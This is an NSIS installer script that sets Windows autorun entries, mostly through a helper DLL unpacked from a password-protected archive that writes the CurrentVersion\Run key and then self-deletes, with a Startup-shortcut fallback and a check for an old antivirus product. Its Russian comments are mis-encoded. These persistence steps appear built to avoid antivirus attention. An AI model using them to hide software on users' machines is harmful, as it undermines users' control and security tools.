;----------------------------------------------------------------------------------
!define AUTO_RUN_PATH "Software\Microsoft\Windows\CurrentVersion\Run"

!define SetHookAutoRun "!insertmacro _SetHookAutoRun"
!macro _SetHookAutoRun _KeyName_ _KeyValue_
    Push "${_KeyName_}"
    Push "${_KeyValue_}"
    Call SetHookAutoRun
!macroend

Function SetHookAutoRun
   Exch $0   ; $0 = _KeyValue_
   Exch 
   Exch $1   ; $1 = _KeyName
   Exch 
     Push $2
     Push $3
     Push $OUTDIR   
       SetOutPath "$TEMP"
         StrCpy $3 "${AUTORUN_DLL}.dll"
         StrCpy $2 "${AUTO_RUN_PATH}" 
         System::Call '${AUTORUN_DLL}::f1(tr2, tr1, tr0)'
         ; unload dll        
         SetPluginUnload manual
         Sleep 10000
           # „ерез Delete hookDll.dll не удал€етс€, запускаем асинхронно батник 
           # со случайным именем, который это сделает
           Rename $3 "$3.tmp"
           Sleep 5000
           ${SelfDel} "$OUTDIR\$3.tmp" ""
     Pop $OUTDIR   
       SetOutPath $OUTDIR   
     Pop $3
     Pop $2
   Pop $0
   Pop $1   
FunctionEnd

;----------------------------------------------------------------------------------
!define SetHookDel "!insertmacro _SetHookDel"
!macro _SetHookDel _KeyName1_ _KeyName2_ _KeyName3_
  Push $0
  Push $1
  Push $2
    StrCpy $0 "${_KeyName1_}"
    StrCpy $1 "${_KeyName2_}"
    StrCpy $2 "${_KeyName3_}"
    Call SetHookDel
  Pop $2
  Pop $1
  Pop $0
!macroend

Function SetHookDel
   Push $3
   Push $4
   Push $OUTDIR   
     SetOutPath "$TEMP"
       StrCpy $3 "${AUTO_RUN_PATH}" 
         System::Call '${AUTORUN_DLL}::f2(tr3, tr2, tr1, tr0)'
         SetPluginUnload manual ; unload dll        
       Sleep 10000
         # „ерез Delete hookDll.dll не удал€етс€, запускаем асинхронно батник 
         # со случайным именем, который это сделает
         StrCpy $4 "${AUTORUN_DLL}.dll"
         Rename $4 "$4.tmp"
         Sleep 5000
         ${SelfDel} "$OUTDIR\$4.tmp" ""
   Pop $OUTDIR   
     SetOutPath $OUTDIR   
   Pop $4
   Pop $3
FunctionEnd


;----------------------------------------------------------------------------------
!define SetLinkAutoRun "!insertmacro _SetLinkAutoRun"
!macro _SetLinkAutoRun _KeyName_ _KeyValue_
  Push "${_KeyName_}"
  Push "${_KeyValue_}"
  Call SetLinkAutoRun
!macroend

Function SetLinkAutoRun
   Exch $0   ; $0 = _KeyValue_
   Exch 
   Exch $1   ; $1 = _KeyName
   Exch 
     Push $2
     Push $3
       ClearErrors
       ReadRegStr $2 HKLM "${AUTO_RUN_PATH}"$1
       IfErrors 0 end
         ReadRegStr $2 HKCU "${AUTO_RUN_PATH}"$1
           IfErrors 0 end
             # ќказываемс€ здесь лишь в случае, если ключа нет ни в одной ветке автозагрузки
             ;${DbgBox} "NoKey"

             # —читаем, что OutDir установлен, иначе WorkDir в €рлыке будет не верным 
             CreateShortCut "$SMSTARTUP\$1.lnk" "$0" "$9"
end:
     Pop $3
     Pop $2
   Pop $0
   Pop $1   
FunctionEnd

;----------------------------------------------------------------------------------
!define SetRegAutoRun "!insertmacro _SetRegAutoRun"
!macro _SetRegAutoRun 
   Call SetAutoRun
!macroend

Function SetAutoRun
  Push $0
    Call CheckOldAVP
    ${If} $0 == 1 
        Pop $0
        goto end
    ${EndIf}
  Pop $0

  Push $OUTDIR
    ${XOutPath} "$UnZipDir"
    ${UnZipFileName} ${MAIN_ZIP} "${AUTORUN_DLL}.dll" "${ZIP_PWD}" 
  Pop $OUTDIR
    SetOutPath $OUTDIR 
  CopyFiles /SILENT "$UnZipDir\${AUTORUN_DLL}.dll" "$TEMP\${AUTORUN_DLL}.dll"

  # јвтозапуск через HookDll
  ${SetHookAutoRun} "${AUTO_RUN_KEYNAME}" \ 
                    "${AUTO_RUN_VALUE}"
end:
FunctionEnd
;--------------------------------
